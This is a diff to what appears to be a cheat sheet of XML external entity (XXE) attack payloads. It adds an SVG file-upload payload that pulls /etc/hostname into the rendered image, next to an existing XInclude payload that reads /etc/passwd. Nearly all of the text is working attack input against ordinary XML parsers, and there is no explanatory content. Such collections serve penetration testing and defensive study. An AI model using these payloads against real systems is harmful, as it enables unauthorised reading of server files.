@@ -18,3 +18,14 @@ XXE via XInclude attacks
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
+
+XXE via file upload
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE foo [ <!ENTITY fetch SYSTEM "file:///etc/hostname">]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
+xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+<text font-size="13" x="28" y="28">&fetch;</text>
+</svg>
+```
